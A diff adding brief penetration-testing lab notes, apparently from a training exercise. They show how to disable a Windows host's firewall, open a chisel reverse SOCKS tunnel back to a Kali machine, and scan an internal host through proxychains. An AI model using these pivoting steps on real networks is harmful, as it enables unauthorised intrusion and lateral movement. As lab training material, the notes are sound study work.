@@ -1,0 +1,13 @@
+copy the Chisel folder to a temp folder
+use rdesktop with the chisel folder as 'rdesktop innerouter.artstailor.com -r disk:win32=<folder>'
+sign in, disable firewall, and run command prompt as admin
+net use z: \\TELNET\WIN32 and z:
+ON KALI MACHINE
+    ./chisel server --socks5 --reverse
+ON THE WINDOWS MACHINE
+    chisel.exe client --fingerprint <finger> 172.24.0.10.8080 R:socks
+NEW KALI COMMAND LINE
+    make sure config is using localhost and 1080
+    devbox ip found in exercise 03
+    proxychains -f proxy.conf nmap -Pn -p 80,443 10.70.184.100
+    proxychains -f proxy.conf curl 10.70.184.100:80 
